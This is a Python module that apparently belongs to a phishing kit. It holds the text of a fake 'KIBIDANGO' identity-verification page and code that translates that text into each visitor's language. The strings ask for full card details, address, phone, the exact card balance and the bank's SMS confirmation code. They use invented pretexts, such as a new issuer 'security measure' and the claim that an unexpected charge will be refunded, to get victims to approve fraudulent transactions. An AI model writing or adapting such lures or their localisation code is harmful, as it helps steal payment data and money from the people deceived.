from __future__ import annotations

import asyncio
import logging

from api.cache import (
    _is_translation_error,
    get_cached_translation,
    set_cached_translation,
)
from api.locale import skip_translate
from api.translate import _translate_many

logger = logging.getLogger(__name__)

_WAIT_SECONDS = 2.5

PAGE_STRINGS = {
    "page_title": "KIBIDANGO - Identity Verification",
    "page_desc": "Please verify your account to continue.",
    "main_title": "Identity Verification",
    "main_desc": "Please verify your account to continue.",
    "block1_title": "Your account is restricted",
    "block1_sub": "Identity verification is required",
    "block2_title": "Your country has been detected",
    "block2_sub": "To comply with regulatory requirements",
    "block3_title": "Quick and easy verification",
    "block3_sub": "Completed in minutes",
    "cta_main": "I Understand",
    "modal_title": "Identity Verification",
    "pm_header": "Verification method",
    "pm_label": "Card",
    "lbl_card": "Card information",
    "lbl_name": "Cardholder name",
    "lbl_billing": "Billing address",
    "lbl_addr1": "Address",
    "lbl_addr2": "Address line 2 (optional)",
    "lbl_zip": "Postal code",
    "lbl_city": "City",
    "lbl_phone": "Phone number",
    "ph_search": "Search country...",
    "cta_modal": "Continue",
    "refund": "Free returns & exchanges",
    "footer_by": "Powered by ",
    "footer_terms": "Terms",
    "footer_privacy": "Privacy",
    "err_card": "Invalid card number",
    "err_exp_invalid": "Invalid expiry date",
    "err_exp_expired": "Your card has expired",
    "err_cvv": "Incomplete security code",
    "err_name": "Please enter cardholder name",
    "err_phone": "Invalid phone number",
    "val_card": "Invalid card number",
    "val_exp": "Please enter expiry date",
    "val_cvv": "Please enter security code",
    "val_name": "Please enter cardholder name",
    "ver_title": "Verification",
    "ver_continue": "Continue",
    "ver_desc": (
        "{issuer} has implemented a new security measure: their system now automatically "
        "checks your balance before and after completing the verification. This helps prevent "
        "potential issues, avoid accidental or unauthorized charges, and simplifies refunds "
        "in case of errors. To proceed with the verification, please provide the exact balance "
        "on your card. If it is a credit card, enter the current available balance."
    ),
    "proc_warning": (
        "Currently, the system is unstable, and the process may take a bit longer. "
        "Additional verification may also be required. Please do not leave the page "
        "until the transaction is complete!"
    ),
    "proc_terms": "Terms",
    "proc_privacy": "Privacy",
    "code_screen_title": "Verification",
    "code_title": "Additional Confirmation Required!",
    "code_desc": (
        "You have received an SMS notification from your bank that needs to be confirmed "
        "to complete the transaction. Don't worry if the transaction amount differs — this "
        "is a new verification measure. The funds are reserved and will be refunded after completion."
    ),
    "code_submit": "Confirm",
    "code_err": "Invalid code. Please try again.",
    "chat_title": "Support",
    "chat_placeholder": "Message...",
}


def overlay_custom(strings: dict, config: dict) -> dict:
    out = dict(strings)
    title = (config.get("title") or "").strip()
    desc = (config.get("description") or "").strip()
    btn = (config.get("button_text") or "").strip()
    if title:
        out["page_title"] = title
    if desc:
        out["page_desc"] = desc
        out["main_desc"] = desc
    if btn:
        out["cta_main"] = btn
    return out


async def _fill_and_cache(originals: list[str], dest: str) -> dict[str, str]:
    translated = await _translate_many(originals, dest, source="en")
    mapping: dict[str, str] = {}
    for src, dst in zip(originals, translated):
        if _is_translation_error(dst) or not dst:
            mapping[src] = src
            continue
        mapping[src] = dst
        if dst != src:
            await set_cached_translation(src, dest, dst)
    return mapping


async def resolve_page_i18n(strings: dict[str, str], dest: str) -> tuple[dict[str, str], bool]:
    """Return (strings, complete). complete=False means a background fill is running."""
    if skip_translate(dest):
        return dict(strings), True
    keys = list(strings.keys())
    values = [strings[k] for k in keys]
    out = dict(strings)
    missing: list[str] = []
    missing_idx: list[int] = []
    for i, val in enumerate(values):
        if not val:
            continue
        cached = await get_cached_translation(val, dest)
        if cached is not None:
            out[keys[i]] = cached
        else:
            missing.append(val)
            missing_idx.append(i)
    if not missing:
        return out, True

    uniq = list(dict.fromkeys(missing))

    async def _bg():
        try:
            await _fill_and_cache(uniq, dest)
        except Exception as exc:
            logger.warning("background page translate failed: %s", exc)

    task = asyncio.create_task(_fill_and_cache(uniq, dest))
    try:
        mapping = await asyncio.wait_for(asyncio.shield(task), timeout=_WAIT_SECONDS)
        for i in missing_idx:
            out[keys[i]] = mapping.get(values[i], values[i])
        return out, True
    except asyncio.TimeoutError:
        def _consume(t: asyncio.Task):
            if t.cancelled():
                return
            exc = t.exception()
            if exc:
                logger.warning("background page translate failed: %s", exc)

        task.add_done_callback(_consume)
        return out, False
    except Exception as exc:
        logger.warning("page translate failed: %s", exc)
        if task.done() and not task.cancelled() and task.exception():
            logger.warning("page translate task: %s", task.exception())
        else:
            asyncio.create_task(_bg())
        return out, False
